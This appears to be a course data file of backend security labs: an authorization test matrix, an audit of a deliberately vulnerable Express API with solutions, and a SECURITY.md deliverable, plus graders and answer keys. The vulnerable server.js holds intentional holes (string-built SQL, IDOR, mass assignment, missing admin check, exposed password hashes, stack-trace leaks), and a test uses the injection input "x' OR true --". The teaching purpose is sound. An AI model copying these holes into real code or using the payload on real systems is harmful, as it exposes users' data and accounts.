          "Access rules break silently: a refactor drops a middleware and every test of the happy path still passes. An AUTHORIZATION TEST MATRIX tries each sensitive endpoint as each kind of caller (nobody, the owner, another user, another role, an admin) and asserts the status. Write it table-driven with it.each, so adding an endpoint is adding rows. Week 15 covers testing in depth; here the test proves itself by failing when the app is broken.",
        nodeLab: {
          task:
            "Write test/authz.test.js with Vitest and supertest against app.js (it exports the app): for GET /students/:id/payments (owner, other student, instructor, admin, nobody), PATCH /courses/:id (owning instructor, other instructor, student, admin) and GET /admin/users (student, instructor, admin, nobody), assert the expected statuses (401, 403, 404 or 200). The checks run your tests, then run them against copies of the app with one access check switched off (BUG=…): each broken app must make at least one of your tests fail.",
          command: false,
          db: SEC_SQL,
          // As in CI, the database URL comes from the environment (Vitest does not read .env).
          env: { DATABASE_URL: "postgresql://academy_app:app-password@localhost:5432/academy" },
          files: {
            "package.json": pkg({ name: "course-api", scripts: { start: "node --env-file=.env server.js", test: "vitest run" }, deps: ["cookie-parser", "express", "pg"], dev: ["supertest", "vitest"] }),
            ".env": SEC_ENV,
            "db.js": DB_JS,
            "auth.js": AUTH_JS,
            "app.js": `import cookieParser from "cookie-parser";
import express from "express";
import { requireAuth } from "./auth.js";
import { pool } from "./db.js";

// For this exercise, BUG=<name> switches one access check off, to prove the tests notice.
const bug = (name) => process.env.BUG === name;
const forbid = (res) => res.status(403).json({ error: { code: "FORBIDDEN", message: "Not allowed" } });

export const app = express();
app.use(express.json());
app.use(cookieParser());

app.get("/students/:id/payments", requireAuth, async (req, res) => {
  const id = Number(req.params.id);
  const allowed = req.user.role === "admin" || req.user.id === id || bug("payments-open");
  if (!allowed) return res.status(404).json({ error: { code: "STUDENT_NOT_FOUND", message: "No such student" } });
  res.json({ data: (await pool.query("SELECT id, amount FROM payments WHERE student_id = $1", [id])).rows });
});

app.patch("/courses/:id", requireAuth, async (req, res) => {
  const { rows } = await pool.query("SELECT instructor_id FROM courses WHERE id = $1", [Number(req.params.id)]);
  if (!rows[0]) return res.status(404).json({ error: { code: "COURSE_NOT_FOUND", message: "No such course" } });
  const owner = req.user.role === "instructor" && (rows[0].instructor_id === req.user.id || bug("any-instructor"));
  if (req.user.role !== "admin" && !owner) return forbid(res);
  res.json({ data: { updated: true } });
});

app.get("/admin/users", bug("admin-open") ? (req, res, next) => next() : requireAuth, async (req, res) => {
  if (!bug("admin-open") && req.user.role !== "admin") return forbid(res);
  res.json({ data: (await pool.query("SELECT id, role FROM users")).rows });
});
`,
            "server.js": `import { app } from "./app.js";\n\napp.listen(3000, () => console.log("Course API on http://localhost:3000"));\n`,
            "test/authz.test.js": `import request from "supertest";
import { describe, expect, it } from "vitest";
import { app } from "../app.js";

// Each seeded user's cookie: sid=<name>-session (ada and bayo are students, ngozi and tunde instructors, kemi admin).
const as = (name) => ({ Cookie: \`sid=\${name}-session\` });

describe("GET /students/:id/payments", () => {
  it("lets Ada read her own payments", async () => {
    const res = await request(app).get("/students/1/payments").set(as("ada"));
    expect(res.status).toBe(200);
  });
});
`,
          },
          readOnly: ["package.json", ".env", "db.js", "auth.js", "app.js", "server.js"],
          open: "test/authz.test.js",
          solution: {
            "test/authz.test.js": `import request from "supertest";
import { describe, expect, it } from "vitest";
import { app } from "../app.js";

// Each seeded user's cookie: sid=<name>-session (ada and bayo are students, ngozi and tunde instructors, kemi admin).
const as = (name) => (name ? { Cookie: \`sid=\${name}-session\` } : {});

describe("GET /students/:id/payments", () => {
  it.each([
    ["the student herself", "ada", 200],
    ["another student", "bayo", 404],
    ["an instructor", "ngozi", 404],
    ["an admin", "kemi", 200],
    ["nobody", null, 401],
  ])("%s → %i", async (_who, name, status) => {
    const res = await request(app).get("/students/1/payments").set(as(name));
    expect(res.status).toBe(status);
  });
});

describe("PATCH /courses/:id (BE-101 belongs to Ngozi)", () => {
  it.each([
    ["the owning instructor", "ngozi", 200],
    ["another instructor", "tunde", 403],
    ["a student", "ada", 403],
    ["an admin", "kemi", 200],
  ])("%s → %i", async (_who, name, status) => {
    const res = await request(app).patch("/courses/1").set(as(name)).send({ title: "x" });
    expect(res.status).toBe(status);
  });
});

describe("GET /admin/users", () => {
  it.each([
    ["a student", "ada", 403],
    ["an instructor", "tunde", 403],
    ["an admin", "kemi", 200],
    ["nobody", null, 401],
  ])("%s → %i", async (_who, name, status) => {
    const res = await request(app).get("/admin/users").set(as(name));
    expect(res.status).toBe(status);
  });
});
`,
          },
          tests: [
            { label: "Your tests pass against the correct app", check: `const results = await runTests("npm test"); const failed = results.filter((t) => t.state === "fail"); assert(results.length >= 10, "write at least 10 tests (one per caller and endpoint): found " + results.length); eq(failed.map((t) => t.name), [], "every test should pass against the correct app");` },
            { label: "They catch a student reading another student's payments", check: `const r = await runTests("BUG=payments-open npm test"); assert(r.some((t) => t.state === "fail"), "with BUG=payments-open (anyone can read Ada's payments) at least one test must fail");` },
            { label: "They catch any instructor editing any course", check: `const r = await runTests("BUG=any-instructor npm test"); assert(r.some((t) => t.state === "fail"), "with BUG=any-instructor at least one test must fail");` },
            { label: "They catch an unprotected admin endpoint", check: `const r = await runTests("BUG=admin-open npm test"); assert(r.some((t) => t.state === "fail"), "with BUG=admin-open (GET /admin/users open to all) at least one test must fail");` },
          ],
          hint: "One describe per endpoint and it.each([[who, cookieName, status], …]) inside. Send the cookie with .set({ Cookie: \"sid=ada-session\" }); for 'nobody' send no cookie. Test the denials, not only the successes: that is what catches the bugs.",
          successMessage: "Three broken builds, three failing test runs. This matrix is what keeps access control correct through every future refactor.",
        },
      },
      {
        id: "a-be-ex-vuln-audit",
        title: "Exercise: audit a deliberately vulnerable sample API and fix its weaknesses",
        explain:
          "Audit like an attacker: for every route ask who can call it, which record it touches, which fields it reads and writes, what reaches SQL, and what the response and errors reveal. This sample API has six weaknesses, each a classic: find them, fix them, and keep notes (the deliverable writes them up).",
        nodeLab: {
          task:
            "Fix the six weaknesses in server.js: (1) GET /courses/search is injectable; (2) GET /enrollments/:id shows anyone's enrollment (owners and admins only, others 404); (3) POST /users/me accepts role from the body; (4) DELETE /admin/courses/:id has no authorization (admins only, 403 otherwise); (5) GET /users/me returns password_hash; (6) errors return the stack trace and SQL to the client (answer { error: { code: \"INTERNAL_ERROR\", message: \"Something went wrong\" } } and log the details instead).",
          db: SEC_SQL,
          files: {
            ...BASE_FILES,
            "server.js": `${HEAD_JS()}
app.get("/courses/search", async (req, res) => {
  const { rows } = await pool.query(\`SELECT code, title FROM courses WHERE title ILIKE '%\${req.query.q ?? ""}%' ORDER BY code\`);
  res.json({ data: rows });
});

app.get("/enrollments/:id", requireAuth, async (req, res) => {
  const { rows } = await pool.query("SELECT id, student_id, course_id, score FROM enrollments WHERE id = $1", [Number(req.params.id)]);
  if (!rows[0]) return res.status(404).json({ error: { code: "ENROLLMENT_NOT_FOUND", message: "No such enrollment" } });
  res.json({ data: rows[0] });
});

app.post("/users/me", requireAuth, async (req, res) => {
  const { fullName, role } = req.body;
  await pool.query("UPDATE users SET full_name = coalesce($2, full_name), role = coalesce($3, role) WHERE id = $1", [req.user.id, fullName, role]);
  res.status(204).end();
});

app.delete("/admin/courses/:id", requireAuth, async (req, res) => {
  await pool.query("DELETE FROM enrollments WHERE course_id = $1", [Number(req.params.id)]);
  await pool.query("DELETE FROM courses WHERE id = $1", [Number(req.params.id)]);
  res.status(204).end();
});

app.get("/users/me", requireAuth, async (req, res) => {
  const { rows } = await pool.query("SELECT * FROM users WHERE id = $1", [req.user.id]);
  res.json({ data: rows[0] });
});

app.get("/reports/broken", requireAuth, async (req, res) => {
  await pool.query("SELECT * FROM table_that_does_not_exist");
});

app.use((err, req, res, next) => {
  res.status(500).json({ error: err.message, stack: err.stack });
});

${LISTEN_JS}`,
          },
          readOnly: BASE_RO,
          open: "server.js",
          solution: {
            "server.js": `${HEAD_JS()}
// (1) Injection: the search text is a parameter.
app.get("/courses/search", async (req, res) => {
  const { rows } = await pool.query("SELECT code, title FROM courses WHERE title ILIKE $1 ORDER BY code", [\`%\${req.query.q ?? ""}%\`]);
  res.json({ data: rows });
});

// (2) IDOR: only the enrollment's student, or an admin.
app.get("/enrollments/:id", requireAuth, async (req, res) => {
  const { rows } = await pool.query("SELECT id, student_id, course_id, score FROM enrollments WHERE id = $1", [Number(req.params.id)]);
  const enrollment = rows[0];
  if (!enrollment || (enrollment.student_id !== req.user.id && req.user.role !== "admin")) {
    return res.status(404).json({ error: { code: "ENROLLMENT_NOT_FOUND", message: "No such enrollment" } });
  }
  res.json({ data: enrollment });
});

// (3) Mass assignment: users change their name, nothing else.
app.post("/users/me", requireAuth, async (req, res) => {
  await pool.query("UPDATE users SET full_name = coalesce($2, full_name) WHERE id = $1", [req.user.id, req.body?.fullName]);
  res.status(204).end();
});

// (4) Function-level authorization: admins only.
app.delete("/admin/courses/:id", requireAuth, async (req, res) => {
  if (req.user.role !== "admin") return res.status(403).json({ error: { code: "FORBIDDEN", message: "Admins only" } });
  await pool.query("DELETE FROM enrollments WHERE course_id = $1", [Number(req.params.id)]);
  await pool.query("DELETE FROM courses WHERE id = $1", [Number(req.params.id)]);
  res.status(204).end();
});

// (5) Excessive data exposure: name the columns a user may see.
app.get("/users/me", requireAuth, async (req, res) => {
  const { rows } = await pool.query('SELECT id, email, full_name AS "fullName", role FROM users WHERE id = $1', [req.user.id]);
  res.json({ data: rows[0] });
});

app.get("/reports/broken", requireAuth, async (req, res) => {
  await pool.query("SELECT * FROM table_that_does_not_exist");
});

// (6) Errors: details in the log, nothing internal in the response.
app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).json({ error: { code: "INTERNAL_ERROR", message: "Something went wrong" } });
});

${LISTEN_JS}`,
          },
          tests: [
            { label: "(1) The search is not injectable", check: `const r = await get("/courses/search?q=" + encodeURIComponent("x' OR true --")); eq([r.status, r.json?.data], [200, []], "a crafted q matches nothing"); eq((await get("/courses/search?q=react")).json.data.map((c) => c.code), ["WD-201"], "a normal search works");` },
            { label: "(2) Enrollments are private", check: `${AS} eq((await get("/enrollments/3", as("ada"))).status, 404, "Ada reads Bayo's enrollment"); eq((await get("/enrollments/1", as("ada"))).status, 200, "her own"); eq((await get("/enrollments/3", as("kemi"))).status, 200, "the admin");` },
            { label: "(3) No self-promotion", check: `${AS} await post("/users/me", { fullName: "Ada", role: "admin" }, as("ada")); eq(await sql("SELECT role, full_name FROM users WHERE id = 1"), [{ role: "student", full_name: "Ada" }], "the name changes, the role does not");` },
            { label: "(4) Only admins delete courses", check: `${AS} eq((await del("/admin/courses/3", as("tunde"))).status, 403, "an instructor"); eq((await sql("SELECT count(*)::int AS n FROM courses"))[0].n, 3, "nothing was deleted"); eq((await del("/admin/courses/3", as("kemi"))).status, 204, "the admin");` },
            { label: "(5) No password hash in responses", check: `${AS} const r = await get("/users/me", as("ada")); eq(Object.keys(r.json.data).sort(), ["email", "fullName", "id", "role"], "only the profile's fields"); lacks(r.text, "argon2", "no password hash");` },
            { label: "(6) Errors reveal nothing internal", check: `${AS} const r = await get("/reports/broken", as("ada")); eq([r.status, r.json], [500, { error: { code: "INTERNAL_ERROR", message: "Something went wrong" } }], "the 500"); lacks(r.text, "table_that_does_not_exist", "no SQL or table names"); lacks(r.text, "at ", "no stack trace"); has(output(), "table_that_does_not_exist", "the details are logged on the server");` },
          ],
          hint: "Go route by route: a parameter for the search; an ownership check before returning the enrollment; drop role from the update; a role check on the admin route; named columns instead of SELECT *; and an error handler that logs err and answers a generic body.",
          successMessage: "Six vulnerabilities from the OWASP list, six fixes, and a test for each that would catch the mistake coming back.",
        },
      },
    ],
    requirements: { read: true, video: false, assessment: true },
  },

  /* ═══════════════════════════════════════════════════════════════════
     LESSON 106 · 14.P · DELIVERABLE
  ═══════════════════════════════════════════════════════════════════ */
  {
    id: "be-l106-deliverable",
    moduleId: MODULE,
    sectionId: SECTION_ID,
    order: 7,
    covers: ["14.P"],
    title: "Deliverable: A Security-Tested API with Documented Access Rules",
    subtitle: "Who may do what, and what was fixed",
    estimatedMinutes: 90,
    intro: "The deliverable is the document a security reviewer starts from: the access-control matrix of the API, and a remediation note for every weakness found and fixed.",
    atoms: [
      {
        id: "a-be-security-doc",
        title: "Access-control matrices and remediation notes",
        explain:
          "An ACCESS-CONTROL MATRIX lists each endpoint against each role (and 'owner' where ownership matters), with the outcome: allowed, or the status a denied caller gets. It is the specification the authorization tests check. A REMEDIATION NOTE per weakness records: what it was and its OWASP category, how it could be exploited, the fix, and the test that now guards it. Keep both in the repository, and update them in the same pull request as the code.",
        nodeLab: {
          task:
            "Write SECURITY.md with: ## Access control, a Markdown table whose header row names the columns Endpoint, Anonymous, Student, Instructor and Admin, with at least six endpoint rows (each cell an outcome such as 200, 401, 403, 404 or \"own only\"); and ## Remediation, with one ### subsection per weakness fixed in Lesson 105's audit (at least four), each naming its OWASP API category (API1 to API10), the fix, and the test that guards it.",
          command: false,
          files: { "SECURITY.md": "# Security\n\n## Access control\n\n## Remediation\n" },
          open: "SECURITY.md",
          solution: {
            "SECURITY.md":
              "# Security\n\n## Access control\n\n| Endpoint | Anonymous | Student | Instructor | Admin |\n| --- | --- | --- | --- | --- |\n| GET /courses | 200 | 200 | 200 | 200 |\n| POST /courses | 401 | 403 | 201 | 201 |\n| PATCH /courses/:id | 401 | 403 | own courses only (else 403) | 200 |\n| DELETE /courses/:id | 401 | 403 | 403 | 204 |\n| GET /students/:id/payments | 401 | own only (else 404) | 404 | 200 |\n| GET /enrollments/:id | 401 | own only (else 404) | 404 | 200 |\n| GET /admin/users | 401 | 403 | 403 | 200 |\n| PATCH /users/:id/role | 401 | 403 | 403 | 204 |\n\nAny route not in the access table answers 403 NO_RULE.\n\n## Remediation\n\n### SQL injection in course search\n\nCategory: API8 Security Misconfiguration (injection). `q` was concatenated into SQL; `x' OR true --` returned every row.\nFix: the search text is passed as `$1`.\nTest: a crafted `q` returns no rows.\n\n### Any user could read any enrollment\n\nCategory: API1 Broken Object Level Authorization. Changing the id in GET /enrollments/:id showed other students' scores.\nFix: only the enrollment's student or an admin; others get 404.\nTest: Ada requesting Bayo's enrollment gets 404.\n\n### Students could make themselves admin\n\nCategory: API3 Broken Object Property Level Authorization (mass assignment). POST /users/me copied role from the body.\nFix: only fullName can be changed there.\nTest: a body with role leaves the role unchanged.\n\n### Unprotected course deletion\n\nCategory: API5 Broken Function Level Authorization. Any logged-in user could call DELETE /admin/courses/:id.\nFix: admins only, 403 otherwise.\nTest: an instructor gets 403 and nothing is deleted.\n\n### Password hashes in responses\n\nCategory: API3 Broken Object Property Level Authorization (excessive data exposure). GET /users/me returned SELECT *.\nFix: only id, email, fullName and role are selected.\nTest: the response has exactly those keys.\n\n### Stack traces in errors\n\nCategory: API8 Security Misconfiguration. 500s returned the stack and SQL.\nFix: a generic error body; details are logged.\nTest: the response contains no table name or stack frame.\n",
          },
          tests: [
            { label: "An access-control matrix with the roles as columns", check: `const s = section(file("SECURITY.md") || "", "Access control") || ""; const rows = s.split("\\n").filter((l) => /^\\s*\\|/.test(l)); assert(rows.length >= 2, "add a Markdown table"); const head = rows[0].split("|").map((c) => c.trim().toLowerCase()).filter(Boolean); for (const col of ["endpoint", "anonymous", "student", "instructor", "admin"]) assert(head.includes(col), "the header row needs a column named " + col); const body = rows.slice(1).filter((l) => !/^\\s*\\|\\s*-/.test(l)); assert(body.length >= 6, "list at least six endpoints (found " + body.length + ")"); assert(body.every((l) => /\\b(GET|POST|PUT|PATCH|DELETE)\\s+\\//.test(l)), "each row starts with a method and a path"); assert(body.every((l) => l.split("|").filter((c) => c.trim()).length >= 5), "every row needs a cell for each column");` },
            { label: "Denials are explicit", check: `const s = section(file("SECURITY.md") || "", "Access control") || ""; for (const code of ["401", "403"]) has(s, code, "the matrix should show where callers get " + code); assert(/own/i.test(s), "show the ownership rules (\\"own only\\")");` },
            { label: "Remediation notes: category, fix and test for each weakness", check: `const r = (file("SECURITY.md") || "").split(/^## Remediation\\s*$/m)[1] || ""; const notes = r.split(/^### /m).slice(1); assert(notes.length >= 4, "write at least four ### remediation notes (found " + notes.length + ")"); for (const n of notes) { const title = n.split("\\n")[0]; assert(/API(10|[1-9])\\b/.test(n), "'" + title + "' should name its OWASP API category (API1 to API10)"); assert(/fix/i.test(n), "'" + title + "' should describe the fix"); assert(/test/i.test(n), "'" + title + "' should name the test that guards it"); }` },
          ],
          hint: "The matrix comes from Lesson 105 (roles exercise and student records); the remediation notes from the six fixes of the audit: injection, IDOR (API1), mass assignment (API3), function-level authorization (API5), data exposure (API3), error leaks (API8).",
          successMessage: "A reviewer can now test every cell of the matrix and check every fix against its note: security that can be verified, not just asserted.",
        },
      },
    ],
    task: {
      title: "Week 14 deliverable: a security-tested API with documented access-control rules and remediation notes",
      intro: "Secure your course API and document it.",
      prompts: [
        "Add roles to your users table and an access table (Lesson 105) covering every route; make unlisted routes closed.",
        "Enforce ownership on every route that takes a record id (students, enrollments, payments, courses), with 404 for records a caller may not know about.",
        "Write the authorization test matrix with Vitest and supertest; break a check on purpose and confirm a test fails.",
        "Add helmet, a CORS allow-list and the CSRF origin check; run npm audit and fix what it reports.",
        "Write SECURITY.md (matrix and remediation notes). Checkpoint: your API refuses every cross-account and cross-role request a tester tries, and each fixed weakness has a remediation note.",
      ],
      closing: "Next: Week 15, backend testing in depth.",
    },
    requirements: { read: true, video: false, assessment: true },
  },
];
